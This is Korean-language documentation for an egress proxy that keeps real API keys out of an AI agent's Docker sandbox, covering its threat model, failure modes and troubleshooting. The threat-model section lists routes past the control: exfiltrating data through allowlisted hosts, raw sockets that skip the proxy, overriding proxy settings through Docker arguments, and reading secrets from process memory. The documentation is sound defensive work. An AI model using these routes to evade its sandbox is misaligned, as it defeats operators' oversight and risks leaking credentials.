- allowlist에 등록된 호스트 이름이 사설 IP로 리바인딩되는 DNS rebinding — 거부 CIDR은 allowlist 등록 시점이 아니라 연결 시점에 확인됩니다.
- 동일한 uid의 로컬 프로세스가 iron-proxy 데몬 환경을 읽어 비밀을 탈취하는 행위 — 전체 호스트 환경이 아니라 매핑에서 참조하는 환경 변수 이름만 전달됩니다.
- 유출된 샌드박스 프록시 토큰을 가진 LAN 피어가 API 할당량을 소진하는 행위 — 프록시는 Docker 브리지 게이트웨이(Linux) 또는 loopback(Docker Desktop)에 바인딩되며 절대 `0.0.0.0`에 바인딩되지 않으므로 외부 네트워크에서 접근할 수 없습니다.

**보호되지 않는 항목:**

- 손상된 호스트 프로세스. 에이전트 프로세스 자체가 손상되면 호스트의 `~/.hermes/.env`에 있는 실제 키가 그대로 노출됩니다. 이는 호스트 손상이 아니라 *샌드박스* 손상에 대한 심층 방어 기능입니다.
- **신뢰할 수 있는 프록시 경계 자체의 상실.** 토큰 교체 보장은 샌드박스가 마운트된 CA 인증서(`/etc/ssl/certs/hermes-egress-ca.crt`)를 신뢰하고 트래픽이 실제로 *우리* iron-proxy에 도달한다는 가정에 기반합니다. CA 개인 키를 도난당했거나 샌드박스 이그레스가 공격자가 제어하는 프록시 인프라로 리디렉션되면, 중간자 공격자는 유효한 리프 인증서를 제시할 수 있고 프록시 토큰은 더 이상 의미 있는 경계가 되지 않습니다([MITRE ATT&CK T1588.004](https://attack.mitre.org/techniques/T1588/004/) — AiTM을 가능하게 하는 TLS 인증서 자료 확보 참조). CA 키(`0600`이며 호스트에서만 사용 가능)와 프록시 엔드포인트를 그에 맞게 보호하세요.
- 원시 소켓을 사용해 `HTTPS_PROXY`를 우회하는 샌드박스 프로세스. 프록시는 자신을 거치지 않는 트래픽을 가로챌 수 없습니다. Node.js는 `NODE_OPTIONS=--use-openssl-ca`를 통해 부분적으로 완화됩니다(위의 주의사항 참조).
- Docker에 명시적으로 마운트된 credential 파일(`terminal.credential_files` 또는 skill에 등록된 마운트). 이그레스는 provider 환경 변수를 보호하지만 임의로 마운트된 파일을 검사하지는 않습니다. 강제 이그레스 샌드박스에 실제 provider credential을 마운트하지 마세요.
- allowlist에 등록된 호스트를 통한 데이터 유출. `api.openai.com`이 허용된 경우 에이전트는 요청 본문에 유출 데이터를 넣어 해당 호스트로 보낼 수 있습니다. 데몬 로그에는 요청이 발생했다는 사실이 기록되지만 이를 방지하지는 않습니다.
- 지원되지 않는 provider(AWS Bedrock SigV4, GCP Vertex service-account OAuth). 해당 환경 변수는 샌드박스에 남으므로 활성화하면 credential이 프록시를 완전히 우회합니다. [지원되지 않는 provider](#uncovered-providers)를 참조하세요.
- iron-proxy의 메모리 내 secret zeroisation. Go 바이너리는 교체된 실제 credential을 프로세스 메모리에 보관합니다. 동일한 uid의 공격자가 코어 덤프나 `/proc/<pid>/mem`을 읽으면 노출됩니다. 이 계층의 범위 밖입니다.

## 실패 모드

- **바이너리가 설치되지 않았고 `auto_install: true`인 경우** — 처음 `hermes egress setup` 또는 `hermes egress start`를 실행할 때 바이너리를 다운로드합니다. 업스트림 `checksums.txt`와 대조하여 SHA-256을 검증합니다.
- **바이너리가 설치되지 않았고 `auto_install: false`인 경우** — `start`가 수동 설치를 안내하는 명확한 메시지와 함께 실패합니다.
- **`enabled: true`이지만 프록시가 실행 중이 아닌 경우** — `enforce_on_docker: true`(기본값)이면 Docker 샌드박스 생성이 설명 오류와 함께 시작을 거부합니다. `enforce_on_docker: false`이면 실제 credential을 사용해 직접 아웃바운드 연결로 대체하고 경고를 기록합니다.
- **포트 충돌** — iron-proxy가 즉시 종료됩니다. `hermes egress start`가 로그의 마지막 20줄을 보고하고 0이 아닌 종료 코드로 실패합니다.
- **업스트림 호스트 거부** — 샌드박스가 프록시에서 어떤 호스트가 허용되지 않았는지 설명하는 본문과 함께 HTTP 403을 받습니다. 에이전트는 오류를 보고합니다.
- **클라우드 메타데이터 IP(`169.254.169.254`) 요청** — allowlist와 관계없이 `upstream_deny_cidrs`에 의해 거부됩니다.
- **`docker_env`가 프록시 제어 변수와 충돌하는 경우(강제 활성화)** — 샌드박스 생성이 충돌한 키의 이름과 함께 거부됩니다.
- **`docker_forward_env`가 보호된 provider 키를 전달하려는 경우(강제 활성화)** — 샌드박스 생성이 거부됩니다. `docker_forward_env`에서 해당 키를 제거하거나 `proxy.enforce_on_docker: false`로 옵트아웃하세요.
- **`docker_extra_args`가 프록시 환경/네트워크 제어를 덮어쓰는 경우(강제 활성화)** — 샌드박스 생성이 거부됩니다. 사용자가 제공한 `-e HTTPS_PROXY=...`, `--env-file` 또는 `--network` 인수는 Hermes가 생성한 인수 뒤에 실행되어 이그레스를 우회할 수 있습니다.
- **`credential_source: bitwarden`에서 BWS 액세스 토큰이 누락된 경우** — `hermes egress start`가 `--no-bitwarden`을 복구 힌트로 제시하며 거부됩니다.
- **iron-proxy가 5초 안에 바인딩되지 않는 경우** — 프로세스를 종료하고 pidfile을 unlink하며, 포트와 `iron-proxy.log`의 마지막 부분을 오류에 표시합니다.
- **동시에 실행된 `hermes egress start` 호출** — 첫 번째 호출의 데몬이 실행 중이면 두 번째 호출이 "another start in progress"와 함께 거부됩니다. 그렇지 않으면 두 번째 호출이 오래된 pidfile을 unlink하고 계속 진행합니다.

## 문제 해결

### "Refusing to start: BWS_ACCESS_TOKEN is not set"

`credential_source: bitwarden`을 활성화했지만 액세스 토큰 환경 변수가 셸에 없습니다. 다음 중 하나를 수행하세요.

```bash
export BWS_ACCESS_TOKEN=…   # one-shot
hermes egress start
```

또는 `~/.hermes/.env`로 옮기세요. env 모드로 되돌리려면 다음을 실행하세요.

```bash
hermes egress setup --no-bitwarden
```

### "iron-proxy exited immediately"

`~/.hermes/proxy/iron-proxy.log`의 마지막 20줄을 확인하세요. 일반적인 원인은 다음과 같습니다.

- 이미 사용 중인 포트 → `proxy.tunnel_port`를 변경하거나 9090을 사용 중인 다른 프로세스를 종료하세요.
- 잘못된 `proxy.yaml` → `hermes egress setup`을 실행해 다시 생성하세요.
- CA 인증서 / 키 권한이 잘못됨 → `chmod 0o600 ~/.hermes/proxy/ca.key`

### "iron-proxy did not bind \<bind-host\>:9090 within 5s"

데몬은 시작했지만 리스너에 바인딩되지 않았습니다. 보통 바이너리가 멈췄거나 시작 시 비용이 큰 작업을 수행 중이라는 뜻입니다. `~/.hermes/proxy/iron-proxy.log`를 확인하세요. 고아 프로세스는 자동으로 종료되고 pidfile도 정리되므로 `hermes egress start`를 다시 실행하면 됩니다.

### 샌드박스가 프록시에 연결할 때 시간 초과가 발생함(Linux)

컨테이너는 `host.docker.internal`을 Docker 브리지 게이트웨이로 확인하고 프록시는 그곳에 바인딩되지만, 호스트 방화벽(일반적으로 기본 거부 INPUT 설정의 `ufw`)이 `docker0`에서 컨테이너→호스트 트래픽을 삭제합니다. 컨테이너에서 다음을 실행해 확인하세요.

```bash
docker run --rm --add-host host.docker.internal:host-gateway busybox \
  nc -zv -w 3 host.docker.internal 9090
```

`hermes egress status`에 `listening`이 표시되는데도 시간 초과가 발생하면 방화벽에서 브리지 서브넷을 허용하세요. 예를 들어 ufw에서는 다음과 같습니다.

```bash
sudo ufw allow in on docker0 to any port 9090 proto tcp
sudo ufw allow in on docker0 to any port 9091 proto tcp
```

(9091 = `tunnel_port + 1`에 해당하는 일반 HTTP 전달 리스너입니다.)

### 샌드박스가 프록시에서 `HTTP 403`을 수신함

샌드박스 내부의 에이전트가 `proxy.extra_allowed_hosts`에 없는 호스트에 접속하려 했습니다. 403 본문에 해당 호스트가 표시됩니다. 허용하려면 설정에 추가하세요.

```yaml
proxy:
  extra_allowed_hosts:
    - api.example.com
    - "*.staging.example.com"
```

그런 다음 `hermes egress setup`으로 `proxy.yaml`을 다시 생성하고 `hermes egress stop && hermes egress start`를 실행하세요.

### 샌드박스에서 SSL 검증 오류가 발생함

CA가 샌드박스에 마운트되지 않았거나(드문 경우이며 `proxy.enabled: true`이면 Docker 백엔드가 자동으로 처리함), 이미지의 HTTP 클라이언트가 표준이 아닌 환경 변수를 읽고 있는 경우입니다.

```bash
# Inside the sandbox:
cat /etc/ssl/certs/hermes-egress-ca.crt | head -1
# Should print: -----BEGIN CERTIFICATE-----
env | grep -E "^(REQUESTS|CURL|SSL|NODE).*CA"
# Should list all four CA-bundle env vars pointing at /etc/ssl/certs/hermes-egress-ca.crt
```

인증서가 없다면 `proxy.enabled: true`인지, 그리고 `hermes egress status`에 `Listening yes`가 표시되는지 확인하세요. 환경 변수가 없다면 샌드박스 이미지에서 해당 변수를 제거하는 entrypoint를 실행 중일 수 있으니 `docker_env` 설정을 확인하세요.

### 샌드박스가 업스트림에서 `HTTP 401`을 수신함

일반적인 원인은 두 가지입니다.

1. **재설정 시 토큰이 덮어써짐.** `hermes egress setup --rotate-tokens`를 실행했거나 다른 방식으로 토큰을 교체했는데 실행 중인 샌드박스가 여전히 이전 토큰을 보유하고 있습니다. 샌드박스를 다시 시작하세요.
2. **Bitwarden 새로 고침이 조용히 실패함.** 새로운 fail-loud 동작에서는 발생하지 않아야 하지만 `proxy.allow_env_fallback: true`를 설정했다면 데몬이 오래된 env 값으로 시작했을 수 있습니다. 데몬 환경(`/proc/<iron-proxy-pid>/environ`)에서 예상한 `OPENROUTER_API_KEY` 등이 있는지 확인하세요.

### 부모 프로세스가 종료된 후 "Address in use"가 표시됨

부모 Hermes 프로세스가 `hermes egress start` 중에 종료되었습니다(리스닝 확인 중 Ctrl-C, OOM, panic). 새로운 수정 로직은 `Popen` 직후 pidfile을 작성하므로 고아 프로세스를 복구할 수 있습니다.

```bash
hermes egress stop   # finds the orphan via the pidfile, kills it
hermes egress start
```

`hermes egress stop`이 "iron-proxy was not running"이라고 말하지만 `ps`에서 데몬을 여전히 볼 수 있다면 pidfile의 동기화가 어긋난 것입니다. 수동으로 복구하려면 다음을 실행하세요.

```bash
pkill -TERM iron-proxy
rm -f ~/.hermes/proxy/iron-proxy.pid ~/.hermes/proxy/iron-proxy.nonce
hermes egress start
```
### 요청별 동작 점검

고정된 바이너리 버전(**v0.39**)에서는 데몬 수준 이벤트와 요청별 레코드가 모두 `~/.hermes/proxy/iron-proxy.log`에 기록됩니다. 특정 업스트림을 검색하려면 다음과 같이 실행합니다:

```bash
grep '"upstream":"openrouter.ai"' ~/.hermes/proxy/iron-proxy.log | tail -20
```

또는 실시간으로 확인할 수 있습니다:

```bash
tail -f ~/.hermes/proxy/iron-proxy.log | jq
```

고정 버전이 v0.40 이상으로 올라가면(`log.audit_path`가 추가됨) 요청별 레코드는 `~/.hermes/proxy/audit.log`로 이동하고, `iron-proxy.log`에는 데몬 수준 이벤트만 남게 됩니다. 해당 버전이 올라가기 전까지 `audit.log`는 빈 자리 표시자입니다(향후 데몬이 엄격한 권한을 상속할 수 있도록 `0o600` 권한으로 미리 생성됨). 지금은 로그 로테이션 및 모니터링 도구를 `iron-proxy.log`에 연결하고, 버전이 올라간 뒤 `audit.log`를 추가하도록 계획하세요.

## 제한 사항 (v1)

- Docker 백엔드만 지원합니다. Modal, Daytona, SSH 연결은 별도의 PR에서 지원할 예정입니다.
- 서명 기반 인증을 사용하는 프로바이더(AWS SigV4, GCP 서비스 계정 OAuth)는 프록시를 완전히 우회합니다 — [지원되지 않는 프로바이더](#uncovered-providers)를 참조하세요. 헤더 토큰을 사용하는 프로바이더(bearer, `x-api-key`, `api-key`, `x-goog-api-key`)는 모두 지원됩니다.
- 네이티브 Windows 바이너리는 제공되지 않습니다. Linux / macOS / WSL에서 실행하세요.
- CA는 최초 생성 시 10년 유효한 자체 서명 인증서입니다. 로테이션하려면 `openssl genrsa ...`를 직접 실행해야 합니다(또는 `hermes egress rotate-ca`를 추가하는 후속 작업을 기다리세요).
- 설정 또는 매핑을 다시 작성하면서 setup을 다시 실행하면 실행 중인 데몬이 중지됩니다. 다시 시작하거나(규칙 집합만 변경한 경우에는 `hermes egress reload` 사용), 토큰을 로테이션한 뒤 이미 실행 중인 샌드박스도 다시 시작하세요.
- iron-proxy의 메모리 내 시크릿 제로화는 업스트림에서 제어합니다. 동일한 uid를 가진 공격자가 `/proc/<pid>/mem`을 읽을 수 있다면 데몬 메모리에 스왑된 시크릿을 읽을 수 있습니다.
- iron-proxy v0.39는 데몬 하나당 **단일 바인드만** 지원합니다(Linux에서는 Docker 브리지 게이트웨이에, Docker Desktop에서는 루프백에 바인드). 또한 데몬 및 요청별 레코드를 하나의 로그 스트림으로 합칩니다. 업스트림에 `proxy.http_listens`(복수형)와 `log.audit_path`가 추가되면 버전을 올려 다중 바인드와 전용 감사 스트림을 연결할 수 있습니다.

## 함께 보기

- 업스트림 프로젝트: [github.com/ironsh/iron-proxy](https://github.com/ironsh/iron-proxy)
- 업스트림 문서: [docs.iron.sh](https://docs.iron.sh/)
- Bitwarden 통합: [`hermes secrets bitwarden`](../secrets/bitwarden)
- Hermes Docker 터미널 백엔드: [Docker](../docker)
- 개발자 / 기여자 참고 자료: [Egress 프록시 내부 구조](../../developer-guide/egress-internals)
